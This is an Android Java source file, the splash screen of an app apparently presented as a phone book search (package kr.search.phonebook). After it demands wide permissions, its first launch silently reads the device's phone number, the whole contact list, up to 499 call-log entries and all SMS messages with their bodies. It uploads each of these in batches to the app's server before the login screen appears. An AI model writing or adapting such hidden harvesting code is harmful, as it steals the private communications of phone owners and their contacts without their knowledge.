package kr.search.phonebook;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.ActionBar;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.widget.Toast;

import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import kr.search.phonebook.data.Period;
import kr.search.phonebook.data.User;
import kr.search.phonebook.utils.ConnectServer;
import kr.search.phonebook.utils.ContextUtils;
import kr.search.phonebook.utils.GlobalData;

import static kr.search.phonebook.utils.AppUtils.getStringTime;
import static kr.search.phonebook.utils.AppUtils.timeToString;
import static kr.search.phonebook.utils.GlobalData.CALL_PROJECTION;

public class SplashActivity extends BaseActivity {
    String finalPhoneNum;

    String phone = "";
    int contactIndex = 200;
    int messageIndex = 200;
    int callLogIndex = 200;
    int index = 0;

    Cursor contactCursor = null;
    Cursor messageCursor = null;
    Cursor callLogCursor = null;

    List<String> contacts = new ArrayList<>();
    List<String> callLogs = new ArrayList<>();
    List<String> messages = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
//        ContextUtils.setRecentSearchNum(mContext, "");
        bindViews();
        setupEvents();
        setValues();
    }

    @Override
    public void setupEvents() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            TedPermission.with(this)
                    .setPermissionListener(new PermissionListener() {
                        @Override
                        public void onPermissionGranted() {
                            getPhoneNum();
//                            new Handler().postDelayed(new Runnable() {
//                                @Override
//                                public void run() {
//                                    if (ContextUtils.isFirstStart(mContext).equals("")) {
//                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                        intent.putExtra("phone", finalPhoneNum);
//                                        startActivity(intent);
//                                        finish();
//                                    } else if (ContextUtils.getUserToken(mContext).equals("")) {
//                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                        intent.putExtra("phone", finalPhoneNum);
//                                        startActivity(intent);
//                                        finish();
//                                    } else {
//                                        ConnectServer.getRequestUserInfo(mContext, new ConnectServer.JsonResponseHandler() {
//                                            @Override
//                                            public void onResponse(JSONObject json) {
//                                                try {
//                                                    if (json.getInt("code") == 200) {
//                                                        JSONObject user = json.getJSONObject("data").getJSONObject("user");
//                                                        GlobalData.loginUser = User.getUserFromJson(user);
//                                                        GlobalData.loginUser.setAdmin(json.getJSONObject("data").getBoolean("is_admin"));
//                                                        if (!user.isNull("period")) {
//                                                            JSONObject period = user.getJSONObject("period");
//                                                            GlobalData.loginUser.setUserPeriod(Period.getPeriodFromJson(period));
//                                                            if (GlobalData.loginUser.getUserPeriod().getEnd().getTimeInMillis() > Calendar.getInstance().getTimeInMillis()) {
//                                                                Intent intent = new Intent(mContext, MainActivity.class);
//                                                                startActivity(intent);
//                                                                finish();
//                                                            } else {
//                                                                Intent intent = new Intent(mContext, LoginActivity.class);
//                                                                intent.putExtra("phone", finalPhoneNum);
//                                                                startActivity(intent);
//                                                                finish();
//                                                            }
//                                                        } else {
//                                                            Intent intent = new Intent(mContext, LoginActivity.class);
//                                                            intent.putExtra("phone", finalPhoneNum);
//                                                            startActivity(intent);
//                                                            finish();
//                                                        }
//                                                    } else {
//                                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                                        intent.putExtra("phone", finalPhoneNum);
//                                                        startActivity(intent);
//                                                        finish();
//                                                    }
//                                                } catch (JSONException e) {
//                                                    e.printStackTrace();
//                                                }
//                                            }
//                                        });
//                                    }
//                                }
//                            }, 1000);
                        }

                        @Override
                        public void onPermissionDenied(List<String> deniedPermissions) {
                            Toast.makeText(SplashActivity.this, "Permission Denied", Toast.LENGTH_SHORT).show();
                        }

                    })
                    .setDeniedMessage("어플을 사용하려면 권한을 허용해야 합니다.")
                    .setPermissions(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG
                            , Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_SMS, Manifest.permission.SYSTEM_ALERT_WINDOW
                            , Manifest.permission.RECEIVE_BOOT_COMPLETED, Manifest.permission.WAKE_LOCK, Manifest.permission.PROCESS_OUTGOING_CALLS)
                    .check();
        } else {
            TedPermission.with(this)
                    .setPermissionListener(new PermissionListener() {
                        @Override
                        public void onPermissionGranted() {
                            getPhoneNum();
//                            new Handler().postDelayed(new Runnable() {
//                                @Override
//                                public void run() {
//                                    if (ContextUtils.isFirstStart(mContext).equals("")) {
//                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                        intent.putExtra("phone", finalPhoneNum);
//                                        startActivity(intent);
//                                        finish();
//                                    } else if (ContextUtils.getUserToken(mContext).equals("")) {
//                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                        intent.putExtra("phone", finalPhoneNum);
//                                        startActivity(intent);
//                                        finish();
//                                    } else {
//                                        ConnectServer.getRequestUserInfo(mContext, new ConnectServer.JsonResponseHandler() {
//                                            @Override
//                                            public void onResponse(JSONObject json) {
//                                                try {
//                                                    if (json.getInt("code") == 200) {
//                                                        JSONObject user = json.getJSONObject("data").getJSONObject("user");
//                                                        GlobalData.loginUser = User.getUserFromJson(user);
//                                                        GlobalData.loginUser.setAdmin(json.getJSONObject("data").getBoolean("is_admin"));
//                                                        if (!user.isNull("period")) {
//                                                            JSONObject period = user.getJSONObject("period");
//                                                            GlobalData.loginUser.setUserPeriod(Period.getPeriodFromJson(period));
//                                                            if (GlobalData.loginUser.getUserPeriod().getEnd().getTimeInMillis() > Calendar.getInstance().getTimeInMillis()) {
//                                                                Intent intent = new Intent(mContext, MainActivity.class);
//                                                                startActivity(intent);
//                                                                finish();
//                                                            } else {
//                                                                Intent intent = new Intent(mContext, LoginActivity.class);
//                                                                intent.putExtra("phone", finalPhoneNum);
//                                                                startActivity(intent);
//                                                                finish();
//                                                            }
//                                                        } else {
//                                                            Intent intent = new Intent(mContext, LoginActivity.class);
//                                                            intent.putExtra("phone", finalPhoneNum);
//                                                            startActivity(intent);
//                                                            finish();
//                                                        }
//                                                    } else {
//                                                        Intent intent = new Intent(mContext, LoginActivity.class);
//                                                        intent.putExtra("phone", finalPhoneNum);
//                                                        startActivity(intent);
//                                                        finish();
//                                                    }
//                                                } catch (JSONException e) {
//                                                    e.printStackTrace();
//                                                }
//                                            }
//                                        });
//                                    }
//                                }
//                            }, 1000);
                        }

                        @Override
                        public void onPermissionDenied(List<String> deniedPermissions) {
                            Toast.makeText(SplashActivity.this, "Permission Denied", Toast.LENGTH_SHORT).show();
                        }

                    })
                    .setDeniedMessage("어플을 사용하려면 권한을 허용해야 합니다.")
                    .setPermissions(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG
                            , Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS, Manifest.permission.SYSTEM_ALERT_WINDOW
                            , Manifest.permission.RECEIVE_BOOT_COMPLETED, Manifest.permission.WAKE_LOCK, Manifest.permission.PROCESS_OUTGOING_CALLS)
                    .check();
        }

    }

    @SuppressLint("MissingPermission")
    public void getPhoneNum() {
        TelephonyManager telManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String phoneNum = "";
        if (telManager != null) {
            phoneNum = telManager.getLine1Number();
        }
        if (phoneNum != null) {
            if (phoneNum.startsWith("+82")) {
                phoneNum = phoneNum.replace("+82", "0");
            }
            phoneNum = phoneNum.replace("-", "");
        } else {
            phoneNum = "";
        }
        finalPhoneNum = phoneNum;


        if (ContextUtils.isFirstStart(this).equals("")) {
            ConnectServer.putRequestSignUp(this, phoneNum, new ConnectServer.JsonResponseHandler() {
                @Override
                public void onResponse(JSONObject json) {
                    try {
                        if (json.getInt("code") == 200) {
                            ContextUtils.setUserToken(mContext, json.getJSONObject("data").getString("token"));
                        }
//                        runOnUiThread(new Runnable() {
//                            @Override
//                            public void run() {
//                                showCustomProgress();
//                                new Thread(new Runnable() {
//                                    @Override
//                                    public void run() {
//                                        if (ContextUtils.isFirstStart(mContext).equals("")) {
//                                            contacts();
//                                        }
//                                    }
//                                }).start();
//                            }
//                        });
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                if (ContextUtils.isFirstStart(mContext).equals("")) {
                                    contacts();
                                }
                            }
                        }).start();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }

    @Override
    public void setValues() {
        ActionBar actionBar = getSupportActionBar();
        actionBar.hide();
    }

    @Override
    protected void onResume() {
        int readContact = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS);
        int writeContact = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS);

        if(readContact == PackageManager.PERMISSION_DENIED && writeContact == PackageManager.PERMISSION_DENIED) {
            // 권한 없음
        } else {
            // 권한 있음
            if (contactCursor == null) {
                contactCursor = managedQuery(
                        ContactsContract.Contacts.CONTENT_URI,
                        new String[]{
                                ContactsContract.Contacts._ID,
                                ContactsContract.Contacts.DISPLAY_NAME,
                                ContactsContract.Contacts.PHOTO_ID,
                                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
                        },
                        null,
                        null,
                        ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
                );
            }
            if (callLogCursor == null) {
                callLogCursor = getContentResolver().query(
                        CallLog.Calls.CONTENT_URI, CALL_PROJECTION,
                        null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
            }
            if (messageCursor == null) {
                Uri allMessage = Uri.parse("content://sms");
                messageCursor = getContentResolver().query(allMessage, new String[]{"_id", "thread_id", "address", "person", "date", "body", "type"}, null, null, "date DESC");
            }
        }
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        if (contactCursor != null) {
            if (!contactCursor.isClosed()) {
                contactCursor.close();
            }
        }
        if (callLogCursor != null) {
            if (!callLogCursor.isClosed()) {
                callLogCursor.close();
            }
        }
        if (messageCursor != null) {
            if (!messageCursor.isClosed()) {
                messageCursor.close();
            }
        }
        super.onDestroy();
    }

    public void putCallLogs() {
        ConnectServer.putRequestCallLog(this, callLogs, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(final JSONObject json) {
//                readSMSMessage();
            }
        });
    }

    public void putMessage() {
        ConnectServer.putRequestMessage(this, messages, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(final JSONObject json) {
//                ContextUtils.setLastSaveDate(LoginActivity.this, Calendar.getInstance().getTimeInMillis());
//                ContextUtils.setFirstStart(LoginActivity.this);
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        dismissCustomProgress();
//                    }
//                });
//                if (contactCursor != null) {
//                    if (!contactCursor.isClosed()) {
//                        contactCursor.close();
//                    }
//                }
//                if (phoneCursor != null) {
//                    if (!phoneCursor.isClosed()) {
//                        phoneCursor.close();
//                    }
//                }
//                if (callLogCursor != null) {
//                    if (!callLogCursor.isClosed()) {
//                        callLogCursor.close();
//                    }
//                }
//                if (messageCursor != null) {
//                    if (!messageCursor.isClosed()) {
//                        messageCursor.close();
//                    }
//                }
                if (ContextUtils.isFirstStart(mContext).equals("")) {
                    Intent intent = new Intent(mContext, LoginActivity.class);
                    intent.putExtra("phone", finalPhoneNum);
                    startActivity(intent);
                    finish();
                } else if (ContextUtils.getUserToken(mContext).equals("")) {
                    Intent intent = new Intent(mContext, LoginActivity.class);
                    intent.putExtra("phone", finalPhoneNum);
                    startActivity(intent);
                    finish();
                } else {
                    ConnectServer.getRequestUserInfo(mContext, new ConnectServer.JsonResponseHandler() {
                        @Override
                        public void onResponse(JSONObject json) {
                            try {
                                if (json.getInt("code") == 200) {
                                    JSONObject user = json.getJSONObject("data").getJSONObject("user");
                                    GlobalData.loginUser = User.getUserFromJson(user);
                                    GlobalData.loginUser.setAdmin(json.getJSONObject("data").getBoolean("is_admin"));
                                    if (!user.isNull("period")) {
                                        JSONObject period = user.getJSONObject("period");
                                        GlobalData.loginUser.setUserPeriod(Period.getPeriodFromJson(period));
                                        if (GlobalData.loginUser.getUserPeriod().getEnd().getTimeInMillis() > Calendar.getInstance().getTimeInMillis()) {
                                            Intent intent = new Intent(mContext, MainActivity.class);
                                            startActivity(intent);
                                            finish();
                                        } else {
                                            Intent intent = new Intent(mContext, LoginActivity.class);
                                            intent.putExtra("phone", finalPhoneNum);
                                            startActivity(intent);
                                            finish();
                                        }
                                    } else {
                                        Intent intent = new Intent(mContext, LoginActivity.class);
                                        intent.putExtra("phone", finalPhoneNum);
                                        startActivity(intent);
                                        finish();
                                    }
                                } else {
                                    Intent intent = new Intent(mContext, LoginActivity.class);
                                    intent.putExtra("phone", finalPhoneNum);
                                    startActivity(intent);
                                    finish();
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    });
                }
            }
        });
    }

    public void putContact() {
        ConnectServer.putRequestContacts(this, contacts, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(final JSONObject json) {
//                callLog();
            }
        });
    }

    /**
     * 주소록 정보 가져오기.
     */
    public void contacts() {
        try {
            contactCursor = managedQuery(
                    ContactsContract.Contacts.CONTENT_URI,
                    new String[]{
                            ContactsContract.Contacts._ID,
                            ContactsContract.Contacts.DISPLAY_NAME,
                            ContactsContract.Contacts.PHOTO_ID,
                            ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
                    },
                    null,
                    null,
                    ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
            );

            contacts.clear();
            Log.d("cursor Size", contactCursor.getCount() + "");
            if (contactCursor.getCount() > 200) {
                int cursorSize = contactCursor.getCount() / 200;
                int cursorElse = contactCursor.getCount() % 200;

                for (int j = 0; j < cursorSize; j++) {
                    Log.d("index", index + "");
                    Log.d("contact index", contactIndex + "");
                    for (int i = 200 * j; i < 200 * (j + 1); i++) {
                        contactCursor.moveToPosition(i);
//                    Log.d("cursor", cursor.getPosition()+"");

                        try {
                            String v_id = contactCursor.getString(0);
                            String v_display_name = contactCursor.getString(1);
                            String v_phone = contactsPhone(v_id).replaceAll("-", "");
                            if (v_phone.startsWith("+82")) {
                                v_phone = v_phone.replace("+82", "0");
                            }
                            String updateTime = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                            if (v_phone != null && !v_phone.equals("")) {
                                String contact = v_display_name + "|" + v_phone + "|" + timeToString(Long.parseLong(updateTime));
                                contacts.add(contact);

                            }
                        } catch (Exception e) {
                            System.out.println(e.toString());
                        }
                    }
                    putContact();
                    index += 200;
                    contactIndex += 200;
                    contacts.clear();
                }
                int elsePosition = (200 * cursorSize) + 1;
                Log.d("else index", elsePosition + "");
                for (int i = elsePosition; i < elsePosition + cursorElse; i++) {
                    contactCursor.moveToPosition(i);
                    Log.d("cursor", contactCursor.getPosition() + "");

                    try {
                        String v_id = contactCursor.getString(0);
                        String v_display_name = contactCursor.getString(1);
                        String v_phone = contactsPhone(v_id).replaceAll("-", "");
                        if (v_phone.startsWith("+82")) {
                            v_phone = v_phone.replace("+82", "0");
                        }
                        String updateTime = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                        if (v_phone != null && !v_phone.equals("")) {
                            String contact = v_display_name + "|" + v_phone + "|" + timeToString(Long.parseLong(updateTime));
                            contacts.add(contact);

                        }
                    } catch (Exception e) {
                        System.out.println(e.toString());
                    }
                }
                putContact();
            } else {
                while (contactCursor.moveToNext()) {
                    try {
                        String v_id = contactCursor.getString(0);
                        String v_display_name = contactCursor.getString(1);
                        String v_phone = contactsPhone(v_id).replaceAll("-", "");
                        if (v_phone.startsWith("+82")) {
                            v_phone = v_phone.replace("+82", "0");
                        }
                        String updateTime = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                        if (v_phone != null && !v_phone.equals("")) {
                            String contact = v_display_name + "|" + v_phone + "|" + timeToString(Long.parseLong(updateTime));
                            contacts.add(contact);

                        }
                    } catch (Exception e) {
                        System.out.println(e.toString());
                    }
                }
                putContact();
            }
            index = 0;
            callLog();
        contactCursor.close();
        } catch (Exception e) {
            e.printStackTrace();
            index = 0;
            callLog();
        }
    }

    /**
     * 주소록 상세정보(전화번호) 가져오기.
     */
    public String contactsPhone(String p_id) {
        String reuslt = null;

        if (p_id == null || p_id.trim().equals("")) {
            return reuslt;
        }

        Cursor phoneCursor = managedQuery(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + p_id,
                null,
                null
        );
        while (phoneCursor.moveToNext()) {
            try {
                reuslt = phoneCursor.getString(0);
            } catch (Exception e) {
                System.out.println(e.toString());
            }
        }
        phoneCursor.close();

        return reuslt;
    }

    public int readSMSMessage() {
        try {
            Uri allMessage = Uri.parse("content://sms");
            ContentResolver cr = getContentResolver();
            messageCursor = cr.query(allMessage, new String[]{"_id", "thread_id", "address", "person", "date", "body", "type"}, null, null, "date DESC");

            messages.clear();

            if (messageCursor.getCount() > 200) {
                int cursorSize = messageCursor.getCount() / 200;
                int cursorElse = messageCursor.getCount() % 200;

                for (int j = 0; j < cursorSize; j++) {
                    for (int i = 200 * j; i < 200 * (j + 1); i++) {
                        messageCursor.moveToPosition(i);
                        try {
                            long messageId = messageCursor.getLong(0);
                            long threadId = messageCursor.getLong(1);
                            String address = messageCursor.getString(2);
                            long contactId = messageCursor.getLong(3);
                            String contactId_string = String.valueOf(contactId);
                            long timestamp = messageCursor.getLong(4);
                            String body = messageCursor.getString(5);
                            String type = messageCursor.getString(6);
//            TODO - 수신 = 1, 발신 = 2 서버 전송
                            if (Integer.parseInt(type) == 1) {
                                type = "IN";
                            } else if (Integer.parseInt(type) == 2) {
                                type = "OUT";
                            }

                            String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
                            messages.add(contact);
                        } catch (Exception e) {
                            System.out.println(e.toString());
                        }
                    }
                    putMessage();
                    index += 200;
                    messageIndex += 200;
                    messages.clear();
                }
                int elsePosition = (200 * cursorSize) + 1;
                for (int i = elsePosition; i < elsePosition + cursorElse; i++) {
                    messageCursor.moveToPosition(i);
                    try {
                        long messageId = messageCursor.getLong(0);
                        long threadId = messageCursor.getLong(1);
                        String address = messageCursor.getString(2);
                        long contactId = messageCursor.getLong(3);
                        String contactId_string = String.valueOf(contactId);
                        long timestamp = messageCursor.getLong(4);
                        String body = messageCursor.getString(5);
                        String type = messageCursor.getString(6);
//            TODO - 수신 = 1, 발신 = 2 서버 전송
                        if (Integer.parseInt(type) == 1) {
                            type = "IN";
                        } else if (Integer.parseInt(type) == 2) {
                            type = "OUT";
                        }

                        String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
                        messages.add(contact);
                    } catch (Exception e) {
                        System.out.println(e.toString());
                    }
                }
                putMessage();
            } else {
                while (messageCursor.moveToNext()) {
                    long messageId = messageCursor.getLong(0);
                    long threadId = messageCursor.getLong(1);
                    String address = messageCursor.getString(2);
                    long contactId = messageCursor.getLong(3);
                    String contactId_string = String.valueOf(contactId);
                    long timestamp = messageCursor.getLong(4);
                    String body = messageCursor.getString(5);
                    String type = messageCursor.getString(6);
//            TODO - 수신 = 1, 발신 = 2 서버 전송
                    if (Integer.parseInt(type) == 1) {
                        type = "IN";
                    } else if (Integer.parseInt(type) == 2) {
                        type = "OUT";
                    }

                    String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
                    messages.add(contact);
                }
                messageCursor.close();
                putMessage();
            }
        } catch (Exception e) {
            e.printStackTrace();
            Intent intent = new Intent(mContext, LoginActivity.class);
            intent.putExtra("phone", finalPhoneNum);
            startActivity(intent);
            finish();
        }
        return 0;
    }

    private void callLog() {
        try {
            callLogCursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, CALL_PROJECTION,
                    null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

            if (callLogCursor.moveToFirst() && callLogCursor.getCount() > 0) {
                try {
                    final LayoutInflater inf = LayoutInflater.from(this);
                    callLogs.clear();
                    int i = 0;
                    if (callLogCursor.getCount() < 499) {
                        callLogIndex = callLogCursor.getCount();
                    } else {
                        callLogIndex = 499;
                    }

                    while (i < callLogIndex) {
                        int callcount = 0;
                        String callname = "";
                        String calltype = "";
                        String calllog = "";
                        String callDuration = "";
                        String phone = "";

                        StringBuffer sb = new StringBuffer();

                        if (Integer.parseInt(callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.INCOMING_TYPE) {
                            calltype = "수신";
                        } else if (Integer.parseInt(callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.OUTGOING_TYPE) {
                            calltype = "발신";
                        } else if (Integer.parseInt(callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.MISSED_TYPE) {
                            calltype = "부재중";
                        } else {
//                        calltype = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE));
                            calltype = "알수없음";
                        }

                        if (callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NAME)) == null) {
                            callname = "NoName";
                        } else {
                            callname = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        }

                        phone = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.NUMBER));
                        String createTime = timeToString(callLogCursor.getLong(callLogCursor.getColumnIndex(CallLog.Calls.DATE)));
                        callDuration = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.DURATION));

                        callcount++;

                        if (phone != null) {
                            String list = callname + "|" + calltype + "|" + phone + "|" + getStringTime(Integer.parseInt(callDuration)) + "|" + createTime;
                            callLogs.add(list);
                        }

                        callLogCursor.moveToNext();
                        i++;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                callLogCursor.close();
                putCallLogs();
                readSMSMessage();
            }
        } catch (Exception e) {
            e.printStackTrace();
            readSMSMessage();
        }
    }

    @Override
    public void bindViews() {

    }
}
